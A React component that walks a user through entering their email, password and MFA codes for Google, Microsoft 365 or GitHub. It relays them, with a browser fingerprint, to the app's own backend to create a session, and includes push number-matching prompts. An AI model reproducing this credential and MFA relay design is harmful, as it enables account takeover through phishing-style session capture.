/**
 * ConnectAccountModal Component
 * Handles the multi-step login flow for external providers (Google, Microsoft, GitHub)
 */

import { useState, FormEvent } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
    Mail,
    Lock,
    ShieldCheck,
    Smartphone,
    AlertCircle,
    Loader2,
    ChevronRight,
    X,
    Layers,
    Github,
} from "lucide-react";
import {
    googleApi,
    officeApi,
    githubApi,
    ApiError,
} from "@core/api/client";
import { LoginResponse } from "@core/types";
import { cn, getBrowserFingerprint } from "@core/utils";

interface ConnectAccountModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: () => void;
}

type Provider = "google" | "office" | "github";
type Step = "provider" | "email" | "password" | "challenge";

export function ConnectAccountModal({ isOpen, onClose, onSuccess }: ConnectAccountModalProps) {
    const [provider, setProvider] = useState<Provider | null>(null);
    const [step, setStep] = useState<Step>("provider");
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [twoFactorCode, setTwoFactorCode] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    // Multi-factor Session State
    const [sessionId, setSessionId] = useState<string | null>(null);
    const [challengeType, setChallengeType] = useState<string | null>(null);
    const [challengeMetadata, setChallengeMetadata] = useState<any>(null);

    // Reset state when closing
    const handleClose = () => {
        setProvider(null);
        setStep("provider");
        setEmail("");
        setPassword("");
        setTwoFactorCode("");
        setIsLoading(false);
        setError(null);
        setSessionId(null);
        setChallengeType(null);
        setChallengeMetadata(null);
        onClose();
    };

    const handleProviderSelect = (p: Provider) => {
        setProvider(p);
        setStep("email");
    };

    const handleInitiate = async (e: FormEvent) => {
        e.preventDefault();
        if (!email || !provider) return;

        setError(null);
        setIsLoading(true);

        try {
            const fingerprint = await getBrowserFingerprint();

            if (provider === "google") {
                const response = await googleApi.initiateLogin({ email, fingerprint });
                handleLoginResponse(response);
            } else if (provider === "office") {
                const response = await officeApi.initiateLogin({ email, fingerprint });
                handleLoginResponse(response);
            } else if (provider === "github") {
                // GitHub uses simple login, so we move to password step locally
                setStep("password");
            }
        } catch (err) {
            setError(err instanceof ApiError ? err.message : "An unexpected error occurred");
        } finally {
            setIsLoading(false);
        }
    };

    const handleSubmitPassword = async (e: FormEvent) => {
        e.preventDefault();
        if (!password || !provider) return;

        setError(null);
        setIsLoading(true);

        try {
            let response: LoginResponse;
            const fingerprint = await getBrowserFingerprint();

            if (provider === "google" && sessionId) {
                response = await googleApi.submitPassword({ sessionId, password });
            } else if (provider === "office" && sessionId) {
                response = await officeApi.submitPassword({ sessionId, password });
            } else if (provider === "github") {
                response = await githubApi.login({ username: email, password, fingerprint });
            } else {
                throw new Error("Session initialization failed. Please try again.");
            }

            handleLoginResponse(response);
        } catch (err) {
            setError(err instanceof ApiError ? err.message : "An unexpected error occurred");
        } finally {
            setIsLoading(false);
        }
    };

    const handle2FASubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!sessionId || !provider) return;

        setError(null);
        setIsLoading(true);

        try {
            let response: LoginResponse;
            if (provider === "google") {
                response = await googleApi.submit2FA({ sessionId, code: twoFactorCode });
            } else if (provider === "office") {
                response = await officeApi.submit2FA({ sessionId, code: twoFactorCode });
            } else {
                response = await githubApi.submit2FA({ sessionId, code: twoFactorCode });
            }

            handleLoginResponse(response);
        } catch (err) {
            setError(err instanceof ApiError ? err.message : "An unexpected error occurred");
        } finally {
            setIsLoading(false);
        }
    };

    const handleSwitchMethod = async (method: string) => {
        if (!sessionId || !provider) return;
        setIsLoading(true);
        setError(null);

        try {
            let response: LoginResponse;
            if (provider === "github") {
                response = await githubApi.switch2FA({ sessionId, method });
            } else {
                throw new Error("Switching methods not supported for this provider yet");
            }
            handleLoginResponse(response);
        } catch (err) {
            setError(err instanceof Error ? err.message : "Failed to switch method");
        } finally {
            setIsLoading(false);
        }
    };

    const handleLoginResponse = (response: LoginResponse) => {
        if (response.success) {
            // Always update sessionId if present
            if (response.sessionId) {
                setSessionId(response.sessionId);
            }

            if (response.status === "authenticated") {
                onSuccess();
                handleClose();
            } else if (response.status === ("challenge_required" as any) || response.status === ("requires_2fa" as any)) {
                setStep("challenge");
                setChallengeType(response.challengeType || null);
                setChallengeMetadata(response.challengeMetadata || null);
                setTwoFactorCode("");
            } else if (step === "email" && provider !== "github") {
                setStep("password");
            }
        } else {
            setError(response.message || "Login failed");
        }
    };

    const getChallengeUI = () => {
        switch (challengeType) {
            case "PUSH":
                return {
                    title: "Check your phone",
                    description: `Confirmation sent to your ${challengeMetadata?.deviceName || 'device'}.`,
                    icon: Smartphone,
                };
            case "TOTP":
                return {
                    title: "Authenticator App",
                    description: "Enter the 6-digit code from your authenticator app.",
                    icon: ShieldCheck,
                };
            case "SMS":
                return {
                    title: "Text Message",
                    description: `We sent a code to your phone ending in ${challengeMetadata?.phoneNumber || '...'}.`,
                    icon: Smartphone,
                };
            case "EMAIL":
                return {
                    title: "Email Verification",
                    description: `We sent a code to your recovery email.`,
                    icon: Mail,
                };
            default:
                return {
                    title: "Security Challenge",
                    description: "Please verify your identity to continue.",
                    icon: ShieldCheck,
                };
        }
    };

    const challengeUI = getChallengeUI();

    if (!isOpen) return null;

    return (
        <AnimatePresence>
            <div className="fixed inset-0 z-[1200] flex items-center justify-center p-4">
                <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    onClick={handleClose}
                    className="absolute inset-0 bg-black/80 backdrop-blur-sm"
                />

                <motion.div
                    initial={{ opacity: 0, scale: 0.95, y: 20 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.95, y: 20 }}
                    className="relative w-full max-w-md glass-container rounded-[2.5rem] p-8 sm:p-10 shadow-2xl overflow-hidden"
                >
                    <button
                        onClick={handleClose}
                        className="absolute top-6 right-6 w-10 h-10 rounded-xl hover:bg-white/5 flex items-center justify-center transition-colors text-gray-500 hover:text-white z-10"
                    >
                        <X className="w-5 h-5" />
                    </button>

                    <div className="relative">
                        {error && (
                            <motion.div
                                initial={{ opacity: 0, y: -10 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="mb-6 p-4 rounded-2xl bg-red-500/10 border border-red-500/20 flex gap-3 items-start"
                            >
                                <AlertCircle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                                <p className="text-sm text-red-400 font-medium">{error}</p>
                            </motion.div>
                        )}

                        {step === "provider" && (
                            <div className="space-y-8">
                                <div className="text-center">
                                    <div className="inline-flex p-3 rounded-2xl bg-primary/10 border border-primary/20 mb-4">
                                        <Layers className="w-6 h-6 text-primary" />
                                    </div>
                                    <h2 className="text-2xl font-bold text-white mb-2">Connect Account</h2>
                                    <p className="text-gray-400 text-sm">Select a provider to create a new session</p>
                                </div>

                                <div className="grid grid-cols-1 gap-3">
                                    <button
                                        onClick={() => handleProviderSelect("google")}
                                        className="w-full p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-primary/50 hover:bg-white/10 transition-all flex items-center gap-4 group"
                                    >
                                        <div className="w-12 h-12 rounded-xl bg-white flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                                            <svg className="w-6 h-6" viewBox="0 0 24 24">
                                                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                                                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                                                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" />
                                                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 12-5.38z" fill="#EA4335" />
                                            </svg>
                                        </div>
                                        <div className="text-left">
                                            <div className="text-sm font-bold text-white">Google Cloud</div>
                                            <div className="text-[10px] text-gray-500 uppercase tracking-widest mt-0.5">Automated Workspace</div>
                                        </div>
                                        <ChevronRight className="w-5 h-5 ml-auto text-gray-600 group-hover:text-primary transition-colors" />
                                    </button>

                                    <button
                                        onClick={() => handleProviderSelect("office")}
                                        className="w-full p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-primary/50 hover:bg-white/10 transition-all flex items-center gap-4 group"
                                    >
                                        <div className="w-12 h-12 rounded-xl bg-[#EB3C00] flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                                            <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M1 1h10v10H1zM13 1h10v10H13zM1 13h10v10H1zM13 13h10v10H13z" />
                                            </svg>
                                        </div>
                                        <div className="text-left">
                                            <div className="text-sm font-bold text-white">Microsoft 365</div>
                                            <div className="text-[10px] text-gray-500 uppercase tracking-widest mt-0.5">Enterprise Infrastructure</div>
                                        </div>
                                        <ChevronRight className="w-5 h-5 ml-auto text-gray-600 group-hover:text-primary transition-colors" />
                                    </button>

                                    <button
                                        onClick={() => handleProviderSelect("github")}
                                        className="w-full p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-primary/50 hover:bg-white/10 transition-all flex items-center gap-4 group"
                                    >
                                        <div className="w-12 h-12 rounded-xl bg-gray-800 flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                                            <Github className="w-6 h-6 text-white" />
                                        </div>
                                        <div className="text-left">
                                            <div className="text-sm font-bold text-white">GitHub Portal</div>
                                            <div className="text-[10px] text-gray-500 uppercase tracking-widest mt-0.5">Development Environment</div>
                                        </div>
                                        <ChevronRight className="w-5 h-5 ml-auto text-gray-600 group-hover:text-primary transition-colors" />
                                    </button>
                                </div>
                            </div>
                        )}

                        {step === "email" && provider && (
                            <form onSubmit={handleInitiate} className="space-y-8">
                                <div className="text-center">
                                    <button
                                        type="button"
                                        onClick={() => setStep("provider")}
                                        className="mb-4 text-[10px] font-black uppercase tracking-widest text-gray-500 hover:text-white flex items-center justify-center gap-2 mx-auto"
                                    >
                                        <X className="w-3 h-3" /> Change Provider
                                    </button>
                                    <h2 className="text-2xl font-bold text-white mb-2 capitalize">{provider} Login</h2>
                                    <p className="text-gray-400 text-sm">Enter the email associated with your account</p>
                                </div>

                                <div className="space-y-4">
                                    <div className="space-y-2">
                                        <label className="text-[11px] font-bold uppercase tracking-widest text-gray-500 ml-1">Account Email</label>
                                        <div className="relative group">
                                            <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 transition-colors group-focus-within:text-primary" />
                                            <input
                                                type="email"
                                                value={email}
                                                onChange={(e) => setEmail(e.target.value)}
                                                placeholder="user@example.com"
                                                className="w-full pl-12 pr-4 py-4 rounded-2xl bg-white/5 border border-white/10 text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all"
                                                autoFocus
                                                disabled={isLoading}
                                            />
                                        </div>
                                    </div>

                                    <button
                                        type="submit"
                                        disabled={isLoading || !email}
                                        className="w-full py-4 rounded-2xl bg-primary text-white font-bold text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2 disabled:opacity-50"
                                    >
                                        {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <>Continue <ChevronRight className="w-4 h-4" /></>}
                                    </button>
                                </div>
                            </form>
                        )}

                        {step === "password" && provider && (
                            <form onSubmit={handleSubmitPassword} className="space-y-8">
                                <div className="text-center">
                                    <div className="text-[10px] font-black uppercase tracking-widest text-primary mb-2">{email}</div>
                                    <h2 className="text-2xl font-bold text-white mb-2">Enter Password</h2>
                                    <p className="text-gray-400 text-sm">Provide your account password to proceed</p>
                                </div>

                                <div className="space-y-4">
                                    <div className="space-y-2">
                                        <label className="text-[11px] font-bold uppercase tracking-widest text-gray-500 ml-1">Password</label>
                                        <div className="relative group">
                                            <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 transition-colors group-focus-within:text-primary" />
                                            <input
                                                type="password"
                                                value={password}
                                                onChange={(e) => setPassword(e.target.value)}
                                                placeholder="••••••••"
                                                className="w-full pl-12 pr-4 py-4 rounded-2xl bg-white/5 border border-white/10 text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all"
                                                autoFocus
                                                disabled={isLoading}
                                            />
                                        </div>
                                    </div>

                                    <button
                                        type="submit"
                                        disabled={isLoading || !password}
                                        className="w-full py-4 rounded-2xl bg-primary text-white font-bold text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2 disabled:opacity-50"
                                    >
                                        {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <>Authenticate <ShieldCheck className="w-4 h-4" /></>}
                                    </button>
                                </div>
                            </form>
                        )}

                        {step === "challenge" && provider && (
                            <div className="space-y-8">
                                <div className="text-center">
                                    <div className="inline-flex p-3 rounded-2xl bg-blue-500/10 border border-blue-500/20 mb-4">
                                        <challengeUI.icon className={cn("w-6 h-6 text-blue-500", challengeType === "PUSH" && "animate-bounce")} />
                                    </div>
                                    <h2 className="text-2xl font-bold text-white mb-2">{challengeUI.title}</h2>
                                    <p className="text-gray-400 text-sm max-w-[280px] mx-auto leading-relaxed">{challengeUI.description}</p>
                                </div>

                                {challengeType === "PUSH" ? (
                                    <div className="mt-8 flex flex-col items-center">
                                        {challengeMetadata?.pushCode ? (
                                            <>
                                                <div className="text-[10px] text-gray-500 uppercase tracking-[0.2em] font-bold mb-4">Verification Code</div>
                                                <div className="relative w-24 h-24 rounded-full border-4 border-blue-500/30 flex items-center justify-center bg-white/5 shadow-[0_0_30px_rgba(96,165,250,0.2)]">
                                                    <span className="text-5xl font-bold text-white tracking-widest leading-none">{challengeMetadata.pushCode}</span>
                                                </div>
                                                <p className="mt-6 text-xs text-gray-500 text-center">Tap the number above on your phone to sign in.</p>
                                            </>
                                        ) : (
                                            <div className="flex flex-col items-center gap-4 py-8 text-center">
                                                <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
                                                <p className="text-xs text-gray-500">Waiting for device response...</p>
                                            </div>
                                        )}
                                    </div>
                                ) : (
                                    <form onSubmit={handle2FASubmit} className="space-y-6">
                                        <div className="space-y-4 text-center">
                                            <input
                                                type="text"
                                                value={twoFactorCode}
                                                onChange={(e) => setTwoFactorCode(e.target.value)}
                                                placeholder="••••••"
                                                className="w-full text-center text-4xl font-mono py-6 rounded-3xl bg-white/5 border border-white/10 text-white focus:outline-none focus:ring-2 focus:ring-blue-500/40 tracking-[0.4em]"
                                                autoFocus
                                                disabled={isLoading}
                                            />
                                            <p className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Enter verification code</p>
                                        </div>

                                        <button
                                            type="submit"
                                            disabled={isLoading || !twoFactorCode}
                                            className="w-full py-4 rounded-2xl bg-blue-600 text-white font-bold text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2"
                                        >
                                            {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify Identity"}
                                        </button>
                                    </form>
                                )}

                                {challengeMetadata?.availableMethods?.length > 1 && (
                                    <div className="pt-6 border-t border-white/5">
                                        <p className="text-[10px] text-center text-gray-500 uppercase tracking-widest font-bold mb-3">Try another method</p>
                                        <div className="grid grid-cols-1 gap-2">
                                            {challengeMetadata.availableMethods
                                                .filter((m: string) => m !== challengeType)
                                                .map((method: string) => (
                                                    <button
                                                        key={method}
                                                        type="button"
                                                        onClick={() => handleSwitchMethod(method)}
                                                        disabled={isLoading}
                                                        className="w-full py-3 px-4 rounded-xl bg-white/5 border border-white/10 hover:border-blue-500/40 hover:bg-white/8 transition-all text-left flex items-center gap-3 group"
                                                    >
                                                        <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                                                            {method === "TOTP" ? <ShieldCheck className="w-4 h-4 text-blue-500" /> : <Smartphone className="w-4 h-4 text-blue-500" />}
                                                        </div>
                                                        <span className="text-white text-xs font-bold capitalize">{method} Verification</span>
                                                        <ChevronRight className="w-4 h-4 ml-auto text-gray-600" />
                                                    </button>
                                                ))}
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                </motion.div>
            </div>
        </AnimatePresence>
    );
}
